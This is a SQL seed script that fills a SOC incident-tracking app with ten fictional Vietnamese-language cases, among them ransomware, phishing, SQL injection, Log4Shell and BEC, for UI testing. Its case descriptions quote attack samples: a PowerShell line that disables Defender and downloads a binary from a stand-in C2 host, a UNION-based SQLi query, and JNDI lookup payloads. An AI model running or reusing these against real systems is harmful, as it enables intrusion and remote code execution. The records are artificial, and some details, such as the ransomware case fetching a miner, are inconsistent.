-- Seed 10 Highly Realistic Cases to evaluate UI/UX
CREATE EXTENSION IF NOT EXISTS pgcrypto;

INSERT INTO cases (
    id, number, title, description, severity, tlp, pap, status, owner, assignee, tags,
    start_date, end_date, flag, summary, impact_status, resolution_status, case_template,
    owning_organisation, organisation_ids, created_at, updated_at
)
VALUES 
-- Case 1: Ransomware
(
    '10000000-0000-0000-0000-000000000040'::uuid, 8,
    'Phát hiện mã độc Ransomware mã hóa dữ liệu trên Server kế toán',
    '## Phân tích sự cố
Hệ thống giám sát EDR phát hiện tiến trình `cmd.exe` thực thi đoạn mã PowerShell đáng ngờ để vô hiệu hóa Windows Defender và mã hóa toàn bộ dữ liệu trên thư mục chia sẻ kế toán (`D:\Accounting_Data`).

### Thông tin kỹ thuật từ SIEM:
- **Hostname**: NCS-ACC-SRV01
- **IP Address**: 192.168.1.55
- **OS Version**: Windows Server 2019 Datacenter
- **Process Tree**: `explorer.exe` -> `cmd.exe` -> `powershell.exe`
- **CommandLine**: `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Stop-Service -Name Windefend; Invoke-WebRequest -Uri http://c2.malicious-domain.xyz/miner.exe -OutFile C:\Windows\Temp\miner.exe"`

### Timeline:
- **08:15 AM**: Cảnh báo EDR kích hoạt.
- **08:20 AM**: SOC Analyst tiếp nhận và cô lập máy chủ.
- **08:35 AM**: Quét và trích xuất IOCs.

Yêu cầu đội ngũ phản ứng sự cố nhanh chóng kiểm tra và restore bản backup gần nhất.',
    3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
    ARRAY['ransomware', 'critical', 'finance', 'windows', 'mitre-attack'],
    now() - interval '2 hours', NULL::timestamptz, true,
    'Ransomware lây nhiễm máy chủ kế toán, EDR đã cô lập.',
    'WithImpact', 'Indeterminate', 'Ransomware Incident Response',
    'NCS SOC', ARRAY['NCS SOC','Finance'], now() - interval '2 hours', now() - interval '5 minutes'
),
-- Case 2: Phishing
(
    '10000000-0000-0000-0000-000000000041'::uuid, 5,
    'Chiến dịch Phishing nhắm vào bộ phận Hành chính Nhân sự',
    '## Phân tích sự cố
Hệ thống Mail Gateway chặn được một loạt email lừa đảo mạo danh thông báo nâng cấp lương gửi đến phòng Hành chính. Tuy nhiên, có 3 user đã click vào link và nhập thông tin.

### Thông tin kỹ thuật từ SIEM:
- **Alert Rule**: Phishing Link Clicked - Azure AD
- **Email Subject**: "[NCS-HR] Thong bao dieu chinh muc luong va tro cap nam 2026"
- **Phishing URL**: `http://hr-salary-update.ncsgroup.xyz/login`
- **Affected Users**: `nguyen.van.a@ncsgroup.vn`, `tran.thi.b@ncsgroup.vn`, `le.van.c@ncsgroup.vn`

### Actions Taken:
- Force reset password cho 3 user bị ảnh hưởng.
- Block domain lừa đảo trên Firewall.
- Quét các email tương tự trong toàn hệ thống.',
    2, 2, 2, 'InProgress', 'nghia.dinh@ncsgroup.vn', 'analyst1@ncsgroup.vn',
    ARRAY['phishing', 'email', 'hr', 'credential-harvesting'],
    now() - interval '1 day', NULL::timestamptz, false,
    'Phishing email mạo danh nhân sự, 3 user đã lộ lọt mật khẩu, đã reset.',
    'WithImpact', 'Indeterminate', 'Phishing Triage',
    'NCS SOC', ARRAY['NCS SOC','HR'], now() - interval '1 day', now() - interval '30 minutes'
),
-- Case 3: Data Exfiltration
(
    '10000000-0000-0000-0000-000000000042'::uuid, 7,
    'Cảnh báo tuồn dữ liệu nhạy cảm ra ngoài qua OneDrive cá nhân',
    '## Phân tích sự cố
DLP (Data Loss Prevention) phát hiện máy tính của nhân viên `NVA01` tải lên một file ZIP nặng 2GB chứa nhiều file tài liệu nội bộ lên một tài khoản Microsoft OneDrive cá nhân.

### Thông tin kỹ thuật từ SIEM:
- **Hostname**: NCS-HR-PC10
- **User Account**: `nva01@ncsgroup.vn`
- **File Name**: `Q1-Finance-Report_Confidential.zip`
- **Target URL**: `https://onedrive.live.com/personal-upload`
- **Rule Triggered**: DLP - Confidential Data Uploaded to Cloud Storage

Yêu cầu điều tra xem đây là hành vi vô ý hay cố ý từ nội bộ (Insider Threat). Đã tạm khóa tài khoản VPN của nhân viên.',
    3, 3, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
    ARRAY['dlp', 'insider-threat', 'data-leak', 'confidential-data'],
    now() - interval '5 hours', NULL::timestamptz, true,
    'Cảnh báo DLP: Nhân viên nén 2GB dữ liệu nội bộ tải lên OneDrive.',
    'WithImpact', 'Indeterminate', 'Insider Threat Investigation',
    'NCS SOC', ARRAY['NCS SOC','Internal Security'], now() - interval '5 hours', now() - interval '1 hour'
),
-- Case 4: SQL Injection
(
    '10000000-0000-0000-0000-000000000043'::uuid, 4,
    'Tấn công SQL Injection vào cổng thông tin khách hàng',
    '## Phân tích sự cố
WAF (Web Application Firewall) ghi nhận lượng lớn request chứa các payload SQLi nhắm vào endpoint `/api/v1/customer/search` trên Cổng thông tin khách hàng.

### Thông tin kỹ thuật từ SIEM:
- **Alert Source**: Cloudflare WAF
- **Target URI**: `/api/v1/customer/search?query=1 UNION SELECT username, password FROM users--`
- **Attacker IP**: `114.114.114.114` (Proxy, VPN)
- **HTTP Status**: 403 Forbidden (Blocked by WAF)

IP tấn công đến từ nhiều dải mạng ẩn danh. Hệ thống WAF đã tự động block, tuy nhiên cần Dev check lại log xem có request nào lọt qua không.',
    2, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'web-sec@ncsgroup.vn',
    ARRAY['sqli', 'waf', 'public-web', 'owasp-top10'],
    now() - interval '3 days', now() - interval '2 days', false,
    'WAF chặn 5000+ request SQLi, không có dữ liệu bị rò rỉ.',
    'NoImpact', 'TruePositive', 'Web Application Attack',
    'NCS SOC', ARRAY['NCS SOC','Public Web'], now() - interval '3 days', now() - interval '2 days'
),
-- Case 5: Brute Force
(
    '10000000-0000-0000-0000-000000000044'::uuid, 10,
    'Brute Force thành công vào tài khoản VPN của sếp',
    '## Phân tích sự cố
Hệ thống SIEM ghi nhận tài khoản VPN của Giám đốc (CEO) bị brute-force liên tục từ các IP Trung Quốc và Nga. Sau 300 lần thử, đã có 1 lần đăng nhập thành công.

### Thông tin kỹ thuật từ SIEM:
- **Affected Account**: `ceo@ncsgroup.vn`
- **Total Attempts**: 342 Failed Logins, 1 Success Login
- **Source IPs**: `114.114.114.114`
- **MFA Status**: Blocked by Authenticator (User rejected)

Rất may hệ thống OTP đã chặn lại, tuy nhiên mật khẩu của CEO đã bị lộ. Cần xử lý khẩn cấp.',
    3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
    ARRAY['brute-force', 'vpn', 'compromised-credential', 'active-directory'],
    now() - interval '30 minutes', NULL::timestamptz, true,
    'Tài khoản VPN bị dò pass thành công, đã bị chặn bởi MFA.',
    'NoImpact', 'Indeterminate', 'Credential Compromise',
    'NCS SOC', ARRAY['NCS SOC','IT Operations'], now() - interval '30 minutes', now() - interval '10 minutes'
),
-- Case 6: Cryptominer
(
    '10000000-0000-0000-0000-000000000045'::uuid, 3,
    'Máy chủ Linux Development bị cài mã độc Cryptominer',
    '## Phân tích sự cố
Cloud Monitor báo động CPU của máy chủ `Dev-Docker-01` tăng lên 100% trong 24h qua. Phân tích tiến trình phát hiện file `xmrig` đang chạy ngầm dưới quyền user `www-data`.

### Thông tin kỹ thuật từ SIEM:
- **Hostname**: Dev-Docker-01
- **OS Version**: Ubuntu 22.04 LTS
- **Process Path**: `/var/tmp/xmrig`
- **MD5 Hash**: `c2b53b8f52afab92b6a07e923838274d`
- **Impact**: CPU 100% Core Utilization

Khả năng máy chủ đã bị khai thác qua một lỗ hổng RCE của ứng dụng web cũ.',
    2, 2, 2, 'Closed', 'nghia.dinh@ncsgroup.vn', 'soc-l1@ncsgroup.vn',
    ARRAY['malware', 'cryptominer', 'linux', 'rce'],
    now() - interval '5 days', now() - interval '4 days', false,
    'Xóa bỏ cryptominer, vá lỗ hổng RCE trên container web.',
    'WithImpact', 'TruePositive', 'Malware Cleanup',
    'NCS SOC', ARRAY['NCS SOC','DevOps'], now() - interval '5 days', now() - interval '4 days'
),
-- Case 7: Suspicious C2 Beaconing
(
    '10000000-0000-0000-0000-000000000046'::uuid, 6,
    'C2 Beaconing từ máy trạm kế toán đến IP lạ',
    '## Phân tích sự cố
Firewall báo cáo máy trạm `PC-KT-05` (IP: 10.0.5.22) liên tục gửi các gói tin HTTPS đều đặn 5 phút/lần (beaconing) ra một địa chỉ IP thuộc danh sách tình báo mạng (C2 Cobalt Strike).

### Thông tin kỹ thuật từ SIEM:
- **Source IP**: `10.0.5.22` (PC-KT-05)
- **Destination Domain**: `api.update-windows.xyz`
- **Interval**: 300s Jitter 10%
- **Signature**: Cobalt Strike Beacon HTTPS Activity

Tiến hành cô lập máy và thu thập memory dump để phân tích mã độc.',
    3, 2, 2, 'InProgress', 'nghia.dinh@ncsgroup.vn', 'soc-l2@ncsgroup.vn',
    ARRAY['c2', 'beaconing', 'cobalt-strike', 'compromised-host'],
    now() - interval '10 hours', NULL::timestamptz, true,
    'Phát hiện beaconing Cobalt Strike từ máy kế toán, đang điều tra memory.',
    'Indeterminate', 'Indeterminate', 'Malware Callback Triage',
    'NCS SOC', ARRAY['NCS SOC','Finance'], now() - interval '10 hours', now() - interval '2 hours'
),
-- Case 8: Zero-day Log4j
(
    '10000000-0000-0000-0000-000000000047'::uuid, 2,
    'Phát hiện dò quét lỗ hổng Log4j trên hệ thống CRM',
    '## Phân tích sự cố
IPS phát hiện nhiều chuỗi JNDI lookup `\${jndi:ldap://malicious.com/a}` trong User-Agent của các request gửi đến CRM. 

### Thông tin kỹ thuật từ SIEM:
- **Alert Source**: Cisco IPS
- **Payload**: `User-Agent: ${jndi:ldap://api.update-windows.xyz/a}`
- **Target IP**: `192.168.10.15` (CRM-WebServer)
- **Vulnerability**: CVE-2021-44228 (Log4Shell)

Hệ thống CRM sử dụng Java nhưng đã được vá Log4j từ năm ngoái. Tuy nhiên cần rà soát lại toàn bộ ứng dụng nội bộ xem có dính không.',
    1, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'soc-l1@ncsgroup.vn',
    ARRAY['log4j', 'rce', 'scanning', 'cve-2021-44228'],
    now() - interval '10 days', now() - interval '9 days', false,
    'Chỉ là dò quét tự động từ botnet, hệ thống đã vá không bị ảnh hưởng.',
    'NoImpact', 'FalsePositive', 'Vulnerability Scanning',
    'NCS SOC', ARRAY['NCS SOC','CRM Team'], now() - interval '10 days', now() - interval '9 days'
),
-- Case 9: DDoS Attack
(
    '10000000-0000-0000-0000-000000000048'::uuid, 1,
    'Tấn công DDoS làm gián đoạn cổng API thanh toán',
    '## Phân tích sự cố
Băng thông mạng tăng vọt lên 50Gbps vào lúc 19:00, làm ngập lụt cổng API thanh toán. Các request phần lớn là HTTP GET flood từ hàng ngàn IP proxy khác nhau.

### Thông tin kỹ thuật từ SIEM:
- **DDoS Target**: `https://api.ncsgroup.vn/v1/payment`
- **Traffic Volume**: Peak 52.4 Gbps, 8.4 Mpps
- **Attack Vector**: Layer 7 HTTP GET Flood / Syn Flood
- **Cloudflare Action**: Under Attack Mode Enabled

Đã bật chế độ Anti-DDoS trên Cloudflare và phân luồng traffic.',
    3, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'net-admin@ncsgroup.vn',
    ARRAY['ddos', 'botnet', 'availability', 'cloudflare'],
    now() - interval '20 days', now() - interval '19 days', true,
    'Gián đoạn dịch vụ 45 phút do DDoS, đã xử lý bằng Cloudflare.',
    'WithImpact', 'TruePositive', 'Network Attack',
    'NCS SOC', ARRAY['NCS SOC','Network Infrastructure'], now() - interval '20 days', now() - interval '19 days'
),
-- Case 10: O365 Compromise
(
    '10000000-0000-0000-0000-000000000049'::uuid, 9,
    'Tài khoản O365 bị xâm nhập và tạo rule forwarding lạ',
    '## Phân tích sự cố
Microsoft 365 Defender cảnh báo tài khoản `sale-director@ncsgroup.vn` đăng nhập thành công từ Nigeria (Impossible Travel), sau đó lập tức tạo Inbox Rule chuyển tiếp (forward) toàn bộ email có chữ "invoice", "payment" sang một địa chỉ Gmail bên ngoài.

### Thông tin kỹ thuật từ SIEM:
- **Affected User**: `sale-director@ncsgroup.vn`
- **Impossible Travel**: Login from VN (18:10), Login from NG (18:15)
- **Inbox Rule Name**: "." (Hidden rule)
- **Inbox Rule Action**: Forward to `attacker-drop@gmail.com`

Đây là dấu hiệu rõ ràng của tấn công BEC (Business Email Compromise).',
    3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '',
    ARRAY['bec', 'o365', 'impossible-travel', 'email-forwarding'],
    now() - interval '1 hour', NULL::timestamptz, true,
    'Tài khoản Giám đốc Sales bị chiếm quyền, tạo rule tuồn email tài chính ra ngoài.',
    'WithImpact', 'Indeterminate', 'BEC Investigation',
    'NCS SOC', ARRAY['NCS SOC','Sales'], now() - interval '1 hour', now() - interval '10 minutes'
)
ON CONFLICT DO NOTHING;

-- Insert Observables for all cases
INSERT INTO observables (
    id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity,
    full_data, data_hash, organisation_ids, tags, created_by, created_at, updated_at
)
VALUES 
-- Observables Case 1040 (Ransomware)
    ('30000000-0000-0000-0000-000000000401'::uuid, '10000000-0000-0000-0000-000000000040'::uuid, 'ip', '192.168.1.55', 'IP máy chủ kế toán bị lây nhiễm', 2, false, true, false, '192.168.1.55', 'sha256:obs401', ARRAY['NCS SOC','Finance'], ARRAY['internal-ip'], 'soc-l2@ncsgroup.vn', now() - interval '1 hour', now() - interval '1 hour'),
    ('30000000-0000-0000-0000-000000000402'::uuid, '10000000-0000-0000-0000-000000000040'::uuid, 'hash', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'SHA256 của file mã độc ransomware', 2, true, true, false, 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'sha256:obs402', ARRAY['NCS SOC','Finance'], ARRAY['malware', 'ransomware'], 'soc-l2@ncsgroup.vn', now() - interval '1 hour', now() - interval '1 hour'),
    ('30000000-0000-0000-0000-000000000403'::uuid, '10000000-0000-0000-0000-000000000040'::uuid, 'domain', 'c2.malicious-domain.xyz', 'Domain nhận kết nối C2 từ malware', 2, true, false, false, 'c2.malicious-domain.xyz', 'sha256:obs403', ARRAY['NCS SOC','Finance'], ARRAY['c2'], 'soc-l2@ncsgroup.vn', now() - interval '1 hour', now() - interval '1 hour'),

-- Observables Case 1041 (Phishing)
    ('30000000-0000-0000-0000-000000000411'::uuid, '10000000-0000-0000-0000-000000000041'::uuid, 'url', 'http://hr-salary-update.ncsgroup.xyz/login', 'Link lừa đảo đăng nhập M365', 2, true, true, false, 'http://hr-salary-update.ncsgroup.xyz/login', 'sha256:obs411', ARRAY['NCS SOC','HR'], ARRAY['phishing', 'url'], 'analyst1@ncsgroup.vn', now() - interval '20 hours', now() - interval '20 hours'),
    ('30000000-0000-0000-0000-000000000412'::uuid, '10000000-0000-0000-0000-000000000041'::uuid, 'mail', 'admin@hr-salary-update.ncsgroup.xyz', 'Email sender mạo danh bộ phận HR', 2, true, true, false, 'admin@hr-salary-update.ncsgroup.xyz', 'sha256:obs412', ARRAY['NCS SOC','HR'], ARRAY['sender'], 'analyst1@ncsgroup.vn', now() - interval '20 hours', now() - interval '20 hours'),

-- Observables Case 1042 (Data Exfiltration)
    ('30000000-0000-0000-0000-000000000421'::uuid, '10000000-0000-0000-0000-000000000042'::uuid, 'filename', 'Q1-Finance-Report_Confidential.zip', 'File ZIP chứa dữ liệu nhạy cảm tải lên OneDrive', 3, false, true, false, 'Q1-Finance-Report_Confidential.zip', 'sha256:obs421', ARRAY['NCS SOC','Internal Security'], ARRAY['sensitive-data'], 'soc-l3@ncsgroup.vn', now() - interval '4 hours', now() - interval '4 hours'),
    ('30000000-0000-0000-0000-000000000422'::uuid, '10000000-0000-0000-0000-000000000042'::uuid, 'user-agent', 'OneDriveClient/23.012', 'Ứng dụng dùng để tải dữ liệu lên', 2, false, false, false, 'OneDriveClient/23.012', 'sha256:obs422', ARRAY['NCS SOC','Internal Security'], ARRAY['app'], 'soc-l3@ncsgroup.vn', now() - interval '4 hours', now() - interval '4 hours'),

-- Observables Case 1044 (Brute Force)
    ('30000000-0000-0000-0000-000000000441'::uuid, '10000000-0000-0000-0000-000000000044'::uuid, 'ip', '114.114.114.114', 'IP thực hiện tấn công Brute force VPN', 2, true, true, false, '114.114.114.114', 'sha256:obs441', ARRAY['NCS SOC','IT Operations'], ARRAY['attacker-ip'], 'soc-l2@ncsgroup.vn', now() - interval '25 minutes', now() - interval '25 minutes'),

-- Observables Case 1045 (Cryptominer)
    ('30000000-0000-0000-0000-000000000451'::uuid, '10000000-0000-0000-0000-000000000045'::uuid, 'hash', 'c2b53b8f52afab92b6a07e923838274d', 'MD5 của xmrig miner', 2, true, true, false, 'c2b53b8f52afab92b6a07e923838274d', 'sha256:obs451', ARRAY['NCS SOC','DevOps'], ARRAY['miner'], 'soc-l1@ncsgroup.vn', now() - interval '4 days', now() - interval '4 days'),

-- Observables Case 1046 (C2 Beaconing)
    ('30000000-0000-0000-0000-000000000461'::uuid, '10000000-0000-0000-0000-000000000046'::uuid, 'domain', 'api.update-windows.xyz', 'Cobalt Strike C2 server', 2, true, true, false, 'api.update-windows.xyz', 'sha256:obs461', ARRAY['NCS SOC','Finance'], ARRAY['cobalt-strike', 'c2'], 'soc-l2@ncsgroup.vn', now() - interval '9 hours', now() - interval '9 hours'),

-- Observables Case 1049 (O365 Compromise)
    ('30000000-0000-0000-0000-000000000491'::uuid, '10000000-0000-0000-0000-000000000049'::uuid, 'mail', 'attacker-drop@gmail.com', 'Email nhận bản forward (Rule BEC)', 2, true, true, false, 'attacker-drop@gmail.com', 'sha256:obs491', ARRAY['NCS SOC','Sales'], ARRAY['bec-destination'], 'soc-l3@ncsgroup.vn', now() - interval '50 minutes', now() - interval '50 minutes')
ON CONFLICT DO NOTHING;

-- Insert Tasks for cases
INSERT INTO task_items (case_id, title, description, status, flag, assignee, group_name, order_index, start_date, due_date, organisation_ids, created_at, updated_at)
VALUES 
    -- Tasks for Case 1040 (Ransomware)
    ('10000000-0000-0000-0000-000000000040'::uuid, 'Cô lập máy chủ bị nhiễm', 'Chặn IP khỏi mạng nội bộ và Internet.', 'Completed', false, 'soc-l2@ncsgroup.vn', 'Containment', 1, now() - interval '1 hour', now() + interval '1 hour', ARRAY['NCS SOC','Finance'], now() - interval '1 hour', now() - interval '45 minutes'),
    ('10000000-0000-0000-0000-000000000040'::uuid, 'Trích xuất IOCs', 'Phân tích file thực thi và PowerShell logs.', 'InProgress', true, 'soc-l2@ncsgroup.vn', 'Analysis', 2, now() - interval '45 minutes', now() + interval '2 hours', ARRAY['NCS SOC','Finance'], now() - interval '1 hour', now() - interval '5 minutes'),
    ('10000000-0000-0000-0000-000000000040'::uuid, 'Khôi phục dữ liệu', 'Restore từ Veeam Backup ngày hôm qua.', 'Waiting', false, '', 'Recovery', 3, NULL::timestamptz, now() + interval '24 hours', ARRAY['NCS SOC','Finance'], now() - interval '1 hour', now() - interval '1 hour'),

    -- Tasks for Case 1041 (Phishing)
    ('10000000-0000-0000-0000-000000000041'::uuid, 'Reset Password user bị hại', 'Reset mật khẩu và force logout mọi session của 3 nhân sự HR.', 'Completed', false, 'analyst1@ncsgroup.vn', 'Containment', 1, now() - interval '20 hours', now() - interval '18 hours', ARRAY['NCS SOC','HR'], now() - interval '20 hours', now() - interval '18 hours'),
    ('10000000-0000-0000-0000-000000000041'::uuid, 'Kiểm tra sign-in logs', 'Quét lịch sử đăng nhập để xem attacker đã truy cập vào file nào chưa.', 'InProgress', true, 'analyst1@ncsgroup.vn', 'Analysis', 2, now() - interval '10 hours', now() + interval '2 hours', ARRAY['NCS SOC','HR'], now() - interval '20 hours', now() - interval '5 hours'),

    -- Tasks for Case 1042 (Data Exfiltration)
    ('10000000-0000-0000-0000-000000000042'::uuid, 'Khóa tài khoản VPN & AD', 'Tạm thời block tài khoản của NVA01.', 'Completed', false, 'soc-l3@ncsgroup.vn', 'Containment', 1, now() - interval '4 hours', now() - interval '3 hours', ARRAY['NCS SOC','Internal Security'], now() - interval '4 hours', now() - interval '3 hours'),

    -- Tasks for Case 1049 (O365 Compromise)
    ('10000000-0000-0000-0000-000000000049'::uuid, 'Xóa Inbox Rule độc hại', 'Xóa rule forward tự động ra ngoài.', 'Completed', false, 'soc-l3@ncsgroup.vn', 'Containment', 1, now() - interval '40 minutes', now() - interval '30 minutes', ARRAY['NCS SOC','Sales'], now() - interval '40 minutes', now() - interval '30 minutes'),
    ('10000000-0000-0000-0000-000000000049'::uuid, 'Thu hồi Token', 'Thu hồi mọi token O365 của sếp.', 'InProgress', true, 'soc-l3@ncsgroup.vn', 'Containment', 2, now() - interval '30 minutes', now() + interval '1 hour', ARRAY['NCS SOC','Sales'], now() - interval '40 minutes', now() - interval '30 minutes')
ON CONFLICT DO NOTHING;

-- Insert Audit History Logs for UI to be rich
INSERT INTO audit_logs (id, actor_id, action, entity_type, entity_id, after_json, created_at)
VALUES 
    (gen_random_uuid(), NULL, 'Create', 'case', '10000000-0000-0000-0000-000000000040', '{"title": "Phát hiện mã độc Ransomware mã hóa dữ liệu trên Server kế toán"}'::jsonb, now() - interval '2 hours'),
    (gen_random_uuid(), NULL, 'Update', 'case', '10000000-0000-0000-0000-000000000040', '{"status": "Open", "assignee": "soc-l2@ncsgroup.vn"}'::jsonb, now() - interval '1 hour 45 minutes'),
    (gen_random_uuid(), NULL, 'Create', 'task', '10000000-0000-0000-0000-000000000040', '{"title": "Cô lập máy chủ bị nhiễm"}'::jsonb, now() - interval '1 hour 30 minutes'),
    (gen_random_uuid(), NULL, 'Update', 'task', '10000000-0000-0000-0000-000000000040', '{"status": "Completed"}'::jsonb, now() - interval '45 minutes'),
    
    (gen_random_uuid(), NULL, 'Create', 'case', '10000000-0000-0000-0000-000000000041', '{"title": "Chiến dịch Phishing nhắm vào bộ phận Hành chính Nhân sự"}'::jsonb, now() - interval '1 day'),
    (gen_random_uuid(), NULL, 'Update', 'case', '10000000-0000-0000-0000-000000000041', '{"status": "InProgress"}'::jsonb, now() - interval '20 hours')
ON CONFLICT DO NOTHING;
